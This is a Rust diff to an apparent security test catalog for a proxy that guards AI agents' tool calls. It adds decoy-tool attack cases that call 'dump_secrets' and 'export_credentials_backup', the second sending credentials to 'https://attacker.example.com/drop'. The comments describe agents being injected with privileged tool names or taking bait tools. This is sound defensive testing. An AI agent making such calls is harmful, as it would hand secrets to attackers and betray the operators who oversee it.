@@ -72,6 +72,15 @@ pub enum Category {
     /// sequence_escalation` override — the same strike fired cold (empty
     /// window) passes. Brain-decided, so excluded from `policy_input()`.
     MultiTurn,
+    /// clavenar-specs/TECH_SPEC.md#deception-layer: a `tools/call`
+    /// naming a registered decoy (a tool name that must never be
+    /// legitimately called). The proxy's decoy gate hard-denies it
+    /// deterministically, before the brain/policy fork, with a body
+    /// deliberately indistinguishable from an ordinary policy deny. The
+    /// case only passes against a stack whose decoy mirror is armed
+    /// (the curated seed) — a bare denylist/brain rule would let these
+    /// names through, so a passing run proves the tripwire is live.
+    Deception,
 }
 
 impl Category {
@@ -88,6 +97,7 @@ impl Category {
             Category::SupplyChain => "supply_chain",
             Category::AgentCert => "agent_cert",
             Category::MultiTurn => "multi_turn",
+            Category::Deception => "deception",
         }
     }
 }
@@ -257,6 +267,30 @@ fn shell_exec(id: u64) -> Value {
     mcp(
         "call_tool",
         json!({"name": "shell_exec", "arguments": {"cmd": "uname -a"}}),
+        id,
+    )
+}
+
+/// A trap decoy from identity's curated seed — never advertised, so a
+/// call to it can only come from an agent guessing or being injected
+/// with a privileged name. The proxy's decoy gate hard-denies it.
+fn decoy_trap_dump_secrets(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({"name": "dump_secrets", "arguments": {}}),
+        id,
+    )
+}
+
+/// An advertised-lure decoy from the curated seed — bait the proxy
+/// splices into `tools/list`. Taking the bait is a compromise signal.
+fn decoy_lure_export_credentials(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "export_credentials_backup",
+            "arguments": {"destination": "https://attacker.example.com/drop"}
+        }),
         id,
     )
 }
@@ -1414,6 +1448,39 @@ pub fn catalog() -> Vec<Attack> {
             payload_builder: compromised_package_install,
             headers_builder: None,
         },
+        // Deception layer (added with the decoy tripwire). Both names are
+        // from identity's curated fleet-wide seed, so they deny against any
+        // stack whose decoy mirror is armed. The proxy masks the trip as an
+        // ordinary policy deny, so the keywords match that envelope
+        // (`security_violation` / the reason sentence) plus the decoy name.
+        Attack {
+            id: "decoy_trap_dump_secrets",
+            category: Category::Deception,
+            description: "Calling the unadvertised trap decoy `dump_secrets` must be \
+                          hard-denied by the proxy decoy gate.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["security_violation", "violates tenant policy", "dump_secrets"],
+            },
+            mode: Mode::Single,
+            payload_builder: decoy_trap_dump_secrets,
+            headers_builder: None,
+        },
+        Attack {
+            id: "decoy_lure_export_credentials",
+            category: Category::Deception,
+            description: "Taking the advertised lure `export_credentials_backup` (bait spliced \
+                          into tools/list) must be hard-denied by the proxy decoy gate.",
+            expected: Expected::Deny {
+                reason_keywords: vec![
+                    "security_violation",
+                    "violates tenant policy",
+                    "export_credentials_backup",
+                ],
+            },
+            mode: Mode::Single,
+            payload_builder: decoy_lure_export_credentials,
+            headers_builder: None,
+        },
         Attack {
             id: "bulk_export_hours",
             category: Category::BusinessHours,
@@ -2488,7 +2555,8 @@ mod tests {
                 | Category::Velocity
                 | Category::Attestation
                 | Category::MultiTurn
-                | Category::AgentCert => assert!(
+                | Category::AgentCert
+                | Category::Deception => assert!(
                     a.policy_input().is_none(),
                     "{} ({:?}) must not be Rego-decidable",
                     a.id,
@@ -2538,6 +2606,8 @@ mod tests {
             "agent_cert_envelope_exceeded",
             "agent_cert_grant_replay",
             "multi_turn_rapport_strike",
+            "decoy_trap_dump_secrets",
+            "decoy_lure_export_credentials",
         ] {
             assert!(ids.contains(&required), "missing attack {}", required);
         }
@@ -2835,6 +2905,7 @@ mod tests {
             Category::SupplyChain.as_str(),
             Category::AgentCert.as_str(),
             Category::MultiTurn.as_str(),
+            Category::Deception.as_str(),
         ];
         let unique: std::collections::HashSet<&str> = strings.iter().copied().collect();
         assert_eq!(unique.len(), strings.len(), "category as_str collision");
